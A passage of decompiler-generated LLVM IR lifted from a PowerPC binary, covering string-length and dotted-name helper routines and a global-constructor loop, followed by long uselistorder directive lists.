  %v2_1000ad6c = add i32 %v0_1000ad6c, %v1_1000ad58
  %v3_1000ad6c = inttoptr i32 %v2_1000ad6c to i8*
  %v4_1000ad6c = load i8, i8* %v3_1000ad6c, align 1
  %v5_1000ad6c = zext i8 %v4_1000ad6c to i32
  %v1_1000ad70 = call i32 @__asm_rlwinm(i32 %v5_1000adc821, i32 8, i32 18, i32 23)
  %v0_1000ad74 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000ad74, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_1000ad7c = or i32 %v5_1000ad6c, %v1_1000ad70
  store i32 %v2_1000ad7c, i32* @r4, align 4
  br label %dec_label_pc_1000adc4

dec_label_pc_1000ad84:                            ; preds = %dec_label_pc_1000ad54
  %v0_1000ad84 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ad84 = add i32 %v0_1000ad84, %v5_1000adc821
  store i32 %v2_1000ad84, i32* @r29, align 4
  %v1_1000ad88 = add i32 %v2_1000ad84, 1
  store i32 %v1_1000ad88, i32* @r28, align 4
  %v1_1000ad8c = load i32, i32* @r24, align 4
  %v2_1000ad8c = icmp ult i32 %v1_1000ad88, %v1_1000ad8c
  br i1 %v2_1000ad8c, label %dec_label_pc_1000ad94, label %dec_label_pc_1000adec

dec_label_pc_1000ad94:                            ; preds = %dec_label_pc_1000ad84
  %v0_1000ad94 = load i32, i32* @r26, align 4
  %v2_1000ad94 = add i32 %v0_1000ad94, %v1_1000ad58
  store i32 %v2_1000ad94, i32* @r4, align 4
  %v0_1000ad98 = load i32, i32* @r25, align 4
  %v2_1000ad98 = add i32 %v0_1000ad98, %v0_1000ad84
  store i32 %v2_1000ad98, i32* @r3, align 4
  store i32 %v5_1000adc821, i32* @r5, align 4
  store i32 268479908, i32* @lr, align 4
  %v0_1000ada0 = call i32 @memcpy()
  %v0_1000ada4 = load i32, i32* @r30, align 4
  %v2_1000ada4 = add i32 %v0_1000ada4, %v5_1000adc821
  store i32 %v2_1000ada4, i32* @r4, align 4
  %v0_1000ada8 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000ada8, label %dec_label_pc_1000adb0, label %dec_label_pc_1000adac

dec_label_pc_1000adac:                            ; preds = %dec_label_pc_1000ad94
  %v0_1000adac = load i32, i32* %r27.global-to-local, align 4
  %v2_1000adac = add i32 %v0_1000adac, %v5_1000adc821
  store i32 %v2_1000adac, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000adb0

dec_label_pc_1000adb0:                            ; preds = %dec_label_pc_1000ad94, %dec_label_pc_1000adac
  %v0_1000adb0 = load i32, i32* @r26, align 4
  %v2_1000adb0 = add i32 %v0_1000adb0, %v2_1000ada4
  %v3_1000adb0 = inttoptr i32 %v2_1000adb0 to i8*
  %v4_1000adb0 = load i8, i8* %v3_1000adb0, align 1
  %v3_1000adb4 = icmp eq i8 %v4_1000adb0, 0
  br i1 %v3_1000adb4, label %dec_label_pc_1000adc0, label %dec_label_pc_1000adbc

dec_label_pc_1000adbc:                            ; preds = %dec_label_pc_1000adb0
  br label %dec_label_pc_1000adc0

dec_label_pc_1000adc0:                            ; preds = %dec_label_pc_1000adb0, %dec_label_pc_1000adbc
  %v0_1000adc0.off0 = phi i8 [ 0, %dec_label_pc_1000adb0 ], [ 46, %dec_label_pc_1000adbc ]
  %v1_1000adc0 = load i32, i32* @r25, align 4
  %v2_1000adc0 = load i32, i32* @r29, align 4
  %v4_1000adc0 = add i32 %v2_1000adc0, %v1_1000adc0
  %v5_1000adc0 = inttoptr i32 %v4_1000adc0 to i8*
  store i8 %v0_1000adc0.off0, i8* %v5_1000adc0, align 1
  %v0_1000adc4.pre = load i32, i32* @r28, align 4
  %v0_1000adcc.pre.pre = load i32, i32* @r23, align 4
  %v1_1000adc8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000adc4

dec_label_pc_1000adc4:                            ; preds = %dec_label_pc_1000ad6c, %dec_label_pc_1000adc0
  %v1_1000adc8 = phi i32 [ %v2_1000ad7c, %dec_label_pc_1000ad6c ], [ %v1_1000adc8.pre, %dec_label_pc_1000adc0 ]
  %v0_1000adcc.pre = phi i32 [ 0, %dec_label_pc_1000ad6c ], [ %v0_1000adcc.pre.pre, %dec_label_pc_1000adc0 ]
  %v0_1000adc4 = phi i32 [ %v0_1000ad74, %dec_label_pc_1000ad6c ], [ %v0_1000adc4.pre, %dec_label_pc_1000adc0 ]
  %v0_1000adc8.pre = load i32, i32* @r26, align 4
  store i32 %v0_1000adc4, i32* %r11.global-to-local, align 4
  %v2_1000adc8 = add i32 %v1_1000adc8, %v0_1000adc8.pre
  %v3_1000adc8 = inttoptr i32 %v2_1000adc8 to i8*
  %v4_1000adc8 = load i8, i8* %v3_1000adc8, align 1
  %v5_1000adc8 = zext i8 %v4_1000adc8 to i32
  store i32 %v5_1000adc8, i32* @r31, align 4
  %v3_1000adcc = icmp eq i32 %v0_1000adcc.pre, 0
  store i1 %v3_1000adcc, i1* %cr4_eq.global-to-local, align 1
  %v3_1000add0 = icmp eq i8 %v4_1000adc8, 0
  br i1 %v3_1000add0, label %dec_label_pc_1000add8, label %dec_label_pc_1000ad4c

dec_label_pc_1000add8:                            ; preds = %dec_label_pc_1000adc4
  %v0_1000ade0.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_1000adcc, label %dec_label_pc_1000adec, label %dec_label_pc_1000addc

dec_label_pc_1000addc:                            ; preds = %dec_label_pc_1000ad3c, %dec_label_pc_1000add8
  %v0_1000ade0.pre26 = phi i32 [ %v0_1000ade0.pre.pre, %dec_label_pc_1000add8 ], [ 0, %dec_label_pc_1000ad3c ]
  %v1_1000addc = add i32 %v0_1000ade0.pre26, 1
  store i32 %v1_1000addc, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000adec

dec_label_pc_1000adec:                            ; preds = %dec_label_pc_1000ad84, %dec_label_pc_1000add8, %dec_label_pc_1000addc, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_1000addc, %dec_label_pc_1000addc ], [ %v0_1000ade0.pre.pre, %dec_label_pc_1000add8 ], [ -1, %dec_label_pc_1000ad84 ]
  %v1_1000adfc = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000ad18)
  %v9_1000adfc = extractvalue %0 %v1_1000adfc, 7
  store i4 %v9_1000adfc, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_1000ade0.pre.pre, { 1, 0 }
  uselistorder i1 %v3_1000adcc, { 0, 2, 1 }
  uselistorder i32 %v5_1000adc8, { 1, 0 }
  uselistorder i32 %v5_1000adc821, { 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_1000ad18, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i4* @cr4, { 2, 3, 4, 6, 0, 5, 1 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 2, 3, 0, 4, 1 }
  uselistorder i32 ()* @memcpy, { 17, 16, 15, 14, 13, 4, 3, 12, 11, 2, 22, 9, 8, 0, 20, 10, 1, 7, 6, 5, 21, 19, 18 }
  uselistorder i32* @r5, { 17, 18, 19, 3, 20, 21, 22, 33, 59, 60, 26, 27, 7, 4, 28, 1, 29, 34, 35, 36, 37, 38, 39, 61, 40, 41, 42, 43, 44, 45, 6, 62, 63, 74, 13, 14, 8, 30, 31, 66, 67, 68, 9, 46, 47, 48, 75, 76, 77, 78, 69, 70, 2, 71, 72, 73, 49, 51, 50, 52, 0, 53, 54, 55, 64, 65, 23, 24, 56, 57, 10, 58, 25, 5, 11, 12, 15, 16, 32 }
  uselistorder i32* @r29, { 34, 35, 36, 37, 38, 130, 131, 1, 39, 12, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 17, 18, 19, 20, 21, 2, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 99, 132, 133, 64, 66, 67, 83, 84, 134, 135, 101, 102, 103, 100, 104, 14, 105, 106, 3, 107, 108, 109, 110, 111, 112, 136, 137, 138, 139, 140, 31, 89, 90, 91, 92, 22, 23, 93, 4, 94, 95, 85, 86, 87, 88, 96, 97, 98, 5, 141, 142, 143, 113, 114, 6, 115, 116, 117, 118, 74, 75, 13, 76, 68, 69, 70, 73, 71, 15, 7, 0, 72, 119, 120, 121, 122, 123, 124, 125, 128, 8, 11, 9, 129, 16, 126, 127, 144, 145, 146, 147, 77, 78, 79, 80, 81, 10, 82, 65, 24, 25, 26, 27, 28, 29, 30, 32, 33 }
  uselistorder i32* @r28, { 2, 33, 34, 35, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 15, 3, 14, 16, 17, 18, 19, 20, 21, 55, 59, 56, 57, 58, 1, 60, 61, 93, 94, 85, 86, 128, 129, 95, 4, 96, 97, 98, 99, 100, 5, 130, 131, 132, 133, 140, 22, 23, 24, 25, 26, 27, 28, 29, 30, 88, 89, 90, 87, 91, 92, 134, 135, 136, 137, 138, 101, 102, 70, 6, 71, 72, 64, 65, 66, 67, 68, 69, 103, 104, 105, 7, 106, 107, 8, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 0, 124, 125, 11, 12, 13, 139, 73, 74, 75, 76, 9, 77, 10, 78, 79, 80, 81, 82, 83, 84, 126, 127, 62, 63, 31, 32 }
  uselistorder i32 23, { 0, 4, 5, 6, 1, 2, 3 }
  uselistorder i32 18, { 1, 0, 3, 4, 2 }
  uselistorder i32 8, { 44, 45, 46, 47, 48, 49, 20, 21, 50, 51, 52, 53, 54, 55, 25, 26, 22, 16, 17, 18, 27, 28, 29, 30, 31, 56, 57, 58, 59, 19, 83, 72, 0, 61, 84, 85, 86, 87, 88, 89, 90, 91, 13, 92, 93, 94, 118, 119, 126, 129, 11, 116, 117, 14, 32, 15, 34, 43, 33, 76, 75, 73, 74, 35, 36, 37, 69, 70, 71, 77, 78, 79, 1, 80, 81, 82, 23, 123, 124, 125, 2, 130, 3, 127, 128, 62, 63, 38, 64, 39, 95, 96, 97, 98, 99, 24, 100, 101, 102, 103, 4, 5, 104, 105, 12, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 10, 6, 120, 121, 122, 65, 66, 67, 68, 60, 7, 8, 9, 40, 41, 42 }
  uselistorder i32* @r30, { 43, 44, 45, 8, 46, 48, 50, 51, 52, 53, 54, 47, 49, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 69, 66, 67, 5, 68, 4, 111, 112, 113, 9, 114, 115, 116, 71, 72, 73, 82, 83, 84, 85, 17, 86, 87, 88, 89, 90, 91, 92, 93, 117, 118, 119, 120, 121, 10, 122, 123, 124, 125, 126, 11, 150, 151, 152, 153, 12, 97, 154, 165, 155, 156, 27, 0, 28, 13, 29, 30, 98, 99, 100, 31, 32, 33, 34, 35, 94, 95, 96, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 157, 158, 159, 160, 161, 162, 163, 14, 164, 127, 128, 80, 78, 79, 81, 77, 75, 74, 6, 76, 129, 130, 131, 132, 133, 2, 135, 18, 136, 15, 137, 138, 134, 139, 140, 141, 142, 143, 144, 145, 16, 146, 147, 3, 148, 149, 70, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i1 false, { 1, 2, 4, 10, 5, 6, 7, 8, 0, 9, 11, 12, 13, 3, 14 }
  uselistorder i32* @r31, { 70, 2, 7, 71, 6, 72, 73, 74, 8, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 45, 50, 9, 39, 10, 11, 51, 52, 53, 89, 90, 91, 92, 1, 93, 94, 95, 96, 97, 98, 99, 100, 12, 101, 200, 201, 202, 203, 204, 102, 13, 103, 104, 105, 106, 14, 107, 108, 109, 110, 111, 112, 205, 206, 207, 208, 209, 210, 211, 212, 213, 15, 214, 16, 266, 267, 268, 17, 119, 118, 3, 120, 121, 144, 171, 172, 173, 174, 175, 59, 60, 61, 62, 122, 18, 123, 124, 19, 133, 134, 20, 135, 136, 215, 216, 217, 218, 219, 21, 220, 221, 222, 223, 22, 224, 23, 225, 226, 227, 44, 228, 0, 269, 270, 271, 24, 46, 272, 40, 179, 25, 180, 278, 279, 258, 42, 259, 260, 273, 276, 277, 68, 69, 261, 262, 263, 264, 54, 55, 56, 57, 58, 63, 64, 4, 181, 182, 183, 184, 185, 186, 65, 66, 67, 187, 188, 176, 177, 178, 189, 190, 191, 27, 192, 193, 194, 26, 195, 196, 197, 198, 199, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 229, 230, 137, 138, 139, 28, 140, 141, 142, 127, 128, 129, 130, 131, 29, 43, 132, 5, 125, 126, 30, 143, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 33, 32, 248, 31, 252, 253, 34, 254, 255, 256, 257, 48, 49, 250, 249, 251, 274, 35, 275, 47, 36, 41, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 157, 156, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 113, 114, 115, 116, 37, 38, 117, 265 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 3, 4, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 15, 16, 17, 5, 18, 0, 19, 6 }
  uselistorder i32* @r25, { 3, 4, 5, 7, 8, 6, 9, 1, 2, 10, 11, 12, 13, 14, 15, 16, 17, 18, 27, 30, 19, 20, 21, 22, 0, 23, 24, 25, 26, 28, 29 }
  uselistorder i32* @r26, { 1, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 3, 4, 20, 21, 22, 23, 25, 2, 26, 27, 29, 30, 31, 32, 33, 34, 35, 49, 50, 72, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 69, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 0, 70, 71, 28, 67, 68, 24 }
  uselistorder i32 ()* @__asm_mfcr, { 28, 27, 21, 26, 25, 12, 20, 17, 11, 9, 16, 8, 7, 6, 5, 4, 3, 2, 1, 23, 15, 35, 24, 34, 19, 18, 10, 31, 30, 14, 33, 13, 32, 29, 22, 0 }
  uselistorder label %dec_label_pc_1000adec, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000addc, { 1, 0 }
  uselistorder label %dec_label_pc_1000adc4, { 1, 0 }
  uselistorder label %dec_label_pc_1000adc0, { 1, 0 }
  uselistorder label %dec_label_pc_1000adb0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad6c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad54, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad4c, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_1000ae08 = load i32, i32* @r3, align 4
  store i32 %v0_1000ae08, i32* %r11.global-to-local, align 4
  %v3_1000ae08 = icmp eq i32 %v0_1000ae08, 0
  %v0_1000ae10 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ae08, i32 %v0_1000ae10)
  %v0_1000ae20 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000ae2c

dec_label_pc_1000ae18:                            ; preds = %dec_label_pc_1000ae28
  %v1_1000ae18 = add i32 %v1_1000ae2c, 2
  br label %dec_label_pc_1000ae48

dec_label_pc_1000ae28:                            ; preds = %dec_label_pc_1000ae2c
  %v2_1000ae40 = add i32 %v1_1000ae30, %v5_1000ae2c
  %v3_1000ae3c = icmp eq i32 %v1_1000ae38, 192
  br i1 %v3_1000ae3c, label %dec_label_pc_1000ae18, label %dec_label_pc_1000ae2c

dec_label_pc_1000ae2c:                            ; preds = %dec_label_pc_1000ae28, %entry
  %v1_1000ae2c = phi i32 [ %v2_1000ae40, %dec_label_pc_1000ae28 ], [ %v0_1000ae20, %entry ]
  %v0_1000ae2c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ae2c = add i32 %v0_1000ae2c, %v1_1000ae2c
  %v3_1000ae2c = inttoptr i32 %v2_1000ae2c to i8*
  %v4_1000ae2c = load i8, i8* %v3_1000ae2c, align 1
  %v5_1000ae2c = zext i8 %v4_1000ae2c to i32
  %v1_1000ae30 = add i32 %v1_1000ae2c, 1
  %v3_1000ae34 = icmp eq i8 %v4_1000ae2c, 0
  %v1_1000ae38 = call i32 @__asm_rlwinm(i32 %v5_1000ae2c, i32 0, i32 24, i32 25)
  br i1 %v3_1000ae34, label %dec_label_pc_1000ae48, label %dec_label_pc_1000ae28

dec_label_pc_1000ae48:                            ; preds = %dec_label_pc_1000ae2c, %dec_label_pc_1000ae18
  %v1_1000ae48 = phi i32 [ %v1_1000ae18, %dec_label_pc_1000ae18 ], [ %v1_1000ae30, %dec_label_pc_1000ae2c ]
  %v0_1000ae48 = load i32, i32* @r4, align 4
  %v2_1000ae48 = sub i32 %v1_1000ae48, %v0_1000ae48
  ret i32 %v2_1000ae48

; uselistorder directives
  uselistorder i32 %v1_1000ae30, { 1, 0 }
  uselistorder i32 %v5_1000ae2c, { 1, 0 }
  uselistorder i32 %v1_1000ae2c, { 2, 1, 0 }
  uselistorder i32 %v0_1000ae08, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 45, 43, 19, 26, 27, 28, 44, 46, 47, 1, 24, 2, 25, 48, 49, 50, 29, 17, 18, 3, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 20, 21, 22, 23, 16, 51 }
  uselistorder i32 24, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 24, 14, 15, 23, 16, 17, 20, 25, 1, 3, 2, 26, 21, 18, 19, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 22, 0 }
  uselistorder i8 0, { 28, 26, 3, 29, 1, 30, 31, 4, 5, 6, 7, 8, 20, 35, 33, 19, 34, 32, 18, 36, 37, 38, 39, 9, 41, 40, 21, 10, 42, 43, 11, 44, 45, 17, 23, 48, 46, 47, 22, 49, 50, 12, 52, 51, 24, 53, 54, 0, 55, 56, 57, 13, 58, 60, 61, 62, 63, 59, 64, 14, 65, 66, 67, 68, 70, 71, 72, 73, 69, 74, 2, 15, 75, 76, 77, 79, 78, 16, 80, 81, 82, 83, 84, 85, 88, 86, 87, 89, 90, 91, 92, 95, 94, 25, 93, 96, 97, 98, 99, 100, 101, 102, 104, 103, 27, 105, 106, 107 }
  uselistorder i32 2, { 0, 30, 4, 80, 45, 81, 82, 31, 1, 2, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 5, 95, 6, 74, 75, 76, 32, 29, 96, 97, 98, 99, 100, 46, 47, 48, 108, 109, 129, 39, 7, 8, 3, 49, 106, 9, 10, 33, 103, 104, 38, 110, 111, 11, 112, 113, 114, 130, 50, 51, 126, 52, 127, 53, 128, 131, 34, 12, 13, 54, 55, 56, 57, 58, 14, 40, 43, 44, 59, 60, 107, 41, 132, 15, 16, 35, 36, 37, 61, 115, 116, 101, 102, 117, 118, 119, 17, 18, 19, 20, 21, 120, 121, 22, 123, 124, 125, 28, 122, 105, 62, 23, 133, 25, 24, 42, 64, 63, 77, 66, 65, 67, 78, 69, 68, 79, 26, 27, 71, 70, 72, 73 }
  uselistorder i32* @r4, { 40, 41, 1, 42, 43, 44, 45, 2, 46, 47, 48, 49, 9, 10, 50, 51, 52, 53, 54, 55, 56, 57, 58, 105, 106, 59, 60, 61, 62, 63, 6, 64, 65, 66, 67, 68, 14, 11, 78, 79, 80, 81, 82, 83, 84, 85, 116, 8, 7, 108, 37, 38, 13, 15, 16, 17, 18, 69, 70, 76, 77, 109, 110, 111, 3, 86, 87, 88, 12, 89, 90, 71, 72, 73, 74, 75, 4, 101, 102, 115, 91, 92, 93, 94, 0, 95, 96, 97, 107, 98, 99, 19, 100, 5, 20, 21, 112, 113, 114, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 39, 103, 104 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12, 25, 13, 1, 17, 18, 19, 20, 21, 26, 14, 22, 15, 16, 28, 27, 23, 24, 2 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1001d044.415 to i32), i32* %r31.global-to-local, align 4
  %v3_1000ae6c = load i32, i32* @global_var_1001d044.415, align 4
  %v3_1000ae70 = icmp eq i32 %v3_1000ae6c, -1
  br i1 %v3_1000ae70, label %dec_label_pc_1000ae8c, label %dec_label_pc_1000ae78

dec_label_pc_1000ae78:                            ; preds = %entry, %dec_label_pc_1000ae78
  %v0_1000ae78 = phi i32 [ %v3_1000ae80, %dec_label_pc_1000ae78 ], [ %v3_1000ae6c, %entry ]
  call void @__pseudo_call(i32 %v0_1000ae78)
  %v0_1000ae80 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ae80 = add i32 %v0_1000ae80, -4
  %v2_1000ae80 = inttoptr i32 %v1_1000ae80 to i32*
  %v3_1000ae80 = load i32, i32* %v2_1000ae80, align 4
  store i32 %v1_1000ae80, i32* %r31.global-to-local, align 4
  %v3_1000ae84 = icmp eq i32 %v3_1000ae80, -1
  br i1 %v3_1000ae84, label %dec_label_pc_1000ae8c, label %dec_label_pc_1000ae78

dec_label_pc_1000ae8c:                            ; preds = %dec_label_pc_1000ae78, %entry
  %v0_1000ae9c = load i32, i32* @r3, align 4
  ret i32 %v0_1000ae9c

; uselistorder directives
  uselistorder i32 %v3_1000ae80, { 1, 0 }
  uselistorder i32 -4, { 29, 20, 21, 22, 13, 14, 15, 16, 17, 23, 24, 2, 3, 4, 5, 6, 7, 8, 9, 10, 18, 19, 33, 34, 30, 31, 32, 25, 26, 27, 28, 11, 12, 0, 1 }
  uselistorder void (i32)* @__pseudo_call, { 4, 3, 5, 6, 1, 2, 0 }
  uselistorder i32 -1, { 320, 321, 16, 47, 59, 218, 219, 60, 267, 122, 220, 61, 221, 51, 62, 222, 63, 223, 192, 193, 111, 112, 65, 64, 194, 48, 49, 195, 196, 197, 155, 71, 69, 67, 198, 199, 200, 70, 68, 66, 201, 202, 156, 203, 157, 224, 25, 26, 158, 225, 159, 52, 226, 72, 268, 123, 3, 4, 269, 270, 53, 271, 272, 73, 74, 0, 160, 322, 29, 30, 31, 323, 161, 327, 27, 28, 204, 326, 310, 75, 311, 162, 312, 32, 33, 313, 314, 228, 34, 238, 239, 240, 126, 241, 242, 243, 244, 245, 246, 247, 124, 248, 125, 249, 250, 251, 252, 163, 273, 164, 54, 5, 165, 274, 275, 166, 167, 168, 276, 169, 255, 256, 35, 36, 37, 170, 257, 258, 171, 229, 233, 234, 50, 277, 278, 279, 120, 55, 280, 281, 282, 283, 127, 284, 6, 76, 285, 286, 287, 288, 289, 172, 290, 128, 291, 292, 129, 7, 8, 130, 56, 293, 173, 174, 294, 295, 296, 297, 77, 78, 324, 325, 79, 259, 131, 80, 81, 82, 83, 84, 85, 86, 87, 88, 328, 89, 330, 329, 90, 315, 316, 132, 175, 317, 40, 41, 176, 318, 38, 39, 177, 214, 9, 133, 91, 92, 319, 134, 205, 10, 93, 57, 207, 42, 43, 178, 135, 113, 208, 94, 206, 253, 254, 46, 179, 260, 114, 261, 262, 136, 266, 95, 331, 332, 298, 96, 180, 181, 263, 264, 182, 265, 118, 58, 183, 184, 185, 186, 187, 44, 188, 137, 97, 235, 115, 230, 232, 231, 17, 18, 19, 20, 21, 22, 23, 116, 117, 299, 15, 300, 11, 301, 302, 189, 138, 24, 190, 303, 304, 1, 306, 307, 2, 139, 140, 191, 45, 141, 121, 308, 142, 305, 236, 12, 13, 209, 309, 143, 237, 144, 227, 145, 98, 99, 100, 101, 102, 103, 210, 104, 105, 106, 333, 211, 212, 213, 146, 147, 109, 108, 107, 215, 148, 216, 149, 150, 151, 152, 14, 119, 217, 110, 153, 154 }
  uselistorder i32 1, { 155, 713, 320, 714, 715, 716, 717, 718, 719, 153, 151, 152, 720, 437, 721, 722, 111, 112, 110, 113, 383, 723, 159, 158, 494, 156, 157, 724, 380, 725, 384, 728, 729, 730, 731, 732, 438, 733, 734, 735, 80, 79, 84, 83, 82, 81, 85, 78, 86, 736, 737, 738, 495, 115, 118, 116, 114, 117, 119, 739, 87, 88, 740, 64, 741, 14, 12, 11, 13, 375, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 497, 496, 180, 179, 178, 181, 182, 183, 648, 649, 650, 651, 498, 489, 220, 212, 222, 211, 217, 218, 219, 216, 214, 215, 213, 221, 223, 392, 742, 743, 377, 744, 745, 746, 747, 748, 749, 499, 8, 7, 9, 6, 10, 428, 753, 750, 751, 752, 500, 312, 310, 309, 306, 308, 311, 313, 305, 304, 307, 303, 302, 754, 653, 654, 655, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 21, 18, 19, 16, 23, 17, 20, 22, 385, 656, 245, 15, 65, 154, 386, 825, 279, 276, 277, 275, 278, 131, 826, 502, 501, 4, 3, 5, 316, 321, 897, 439, 440, 504, 503, 229, 225, 228, 227, 224, 226, 0, 441, 442, 507, 506, 505, 298, 296, 299, 297, 295, 294, 510, 509, 508, 108, 109, 511, 773, 376, 774, 777, 778, 779, 780, 781, 513, 512, 324, 325, 322, 323, 795, 796, 797, 372, 798, 799, 393, 800, 801, 412, 413, 443, 394, 409, 802, 445, 416, 803, 804, 446, 805, 806, 807, 444, 519, 518, 517, 516, 483, 515, 514, 138, 137, 134, 136, 139, 133, 140, 135, 141, 1, 808, 809, 810, 811, 395, 132, 657, 658, 142, 143, 659, 260, 259, 258, 257, 261, 827, 284, 285, 288, 287, 286, 828, 829, 447, 830, 254, 256, 255, 250, 251, 246, 249, 248, 247, 448, 782, 785, 484, 129, 128, 130, 451, 831, 832, 833, 449, 834, 450, 835, 836, 837, 838, 839, 530, 529, 528, 527, 526, 525, 524, 523, 522, 521, 485, 520, 101, 99, 97, 98, 93, 100, 106, 102, 96, 103, 92, 95, 107, 94, 105, 104, 91, 90, 89, 840, 429, 73, 75, 74, 72, 76, 70, 71, 77, 162, 161, 163, 898, 899, 146, 147, 145, 841, 842, 531, 329, 326, 328, 331, 330, 327, 396, 843, 534, 533, 532, 293, 292, 535, 266, 289, 268, 262, 367, 368, 197, 184, 536, 193, 537, 176, 290, 452, 538, 291, 453, 418, 417, 892, 542, 541, 540, 539, 239, 235, 241, 236, 240, 238, 237, 900, 545, 544, 543, 271, 270, 272, 269, 901, 546, 701, 702, 703, 430, 704, 122, 124, 126, 121, 123, 120, 125, 127, 454, 705, 397, 455, 456, 457, 458, 547, 652, 57, 53, 51, 55, 52, 56, 54, 58, 660, 398, 661, 548, 334, 333, 332, 335, 336, 337, 338, 45, 44, 46, 43, 189, 185, 188, 187, 190, 192, 186, 191, 549, 550, 551, 230, 553, 552, 40, 41, 42, 35, 36, 38, 39, 37, 165, 164, 381, 554, 339, 419, 555, 556, 557, 558, 559, 560, 561, 562, 563, 431, 432, 812, 399, 459, 813, 814, 420, 824, 566, 565, 564, 207, 205, 206, 204, 208, 203, 201, 202, 209, 200, 210, 199, 567, 568, 902, 570, 569, 340, 572, 571, 149, 148, 150, 573, 726, 727, 844, 845, 574, 341, 343, 342, 344, 387, 846, 815, 816, 817, 818, 819, 820, 821, 822, 823, 166, 167, 170, 168, 169, 171, 847, 848, 849, 674, 378, 242, 243, 244, 776, 775, 893, 894, 895, 24, 910, 911, 281, 280, 283, 282, 906, 907, 908, 909, 347, 346, 345, 144, 460, 421, 786, 787, 788, 410, 388, 61, 60, 59, 784, 575, 63, 400, 461, 783, 577, 576, 578, 319, 318, 317, 579, 233, 234, 232, 231, 580, 301, 300, 850, 851, 463, 852, 853, 854, 855, 856, 857, 859, 860, 861, 464, 862, 863, 401, 864, 462, 865, 465, 866, 867, 868, 858, 584, 583, 582, 581, 33, 34, 32, 27, 28, 26, 30, 31, 29, 25, 869, 870, 871, 872, 873, 350, 351, 348, 349, 352, 353, 466, 253, 252, 874, 875, 49, 48, 50, 47, 877, 402, 878, 382, 403, 880, 881, 882, 883, 404, 885, 406, 884, 879, 486, 591, 590, 589, 588, 587, 586, 585, 357, 360, 362, 354, 361, 359, 355, 358, 363, 356, 389, 390, 173, 174, 175, 876, 422, 487, 467, 265, 264, 263, 904, 423, 905, 789, 790, 791, 792, 793, 794, 391, 593, 592, 68, 66, 69, 67, 595, 594, 365, 366, 364, 597, 596, 771, 772, 599, 598, 177, 160, 273, 274, 314, 369, 370, 198, 371, 194, 903, 600, 172, 662, 663, 664, 665, 666, 667, 470, 414, 668, 669, 374, 468, 469, 471, 670, 472, 671, 672, 373, 407, 673, 608, 607, 606, 605, 604, 603, 602, 601, 473, 424, 425, 426, 474, 475, 611, 610, 609, 612, 675, 676, 677, 678, 679, 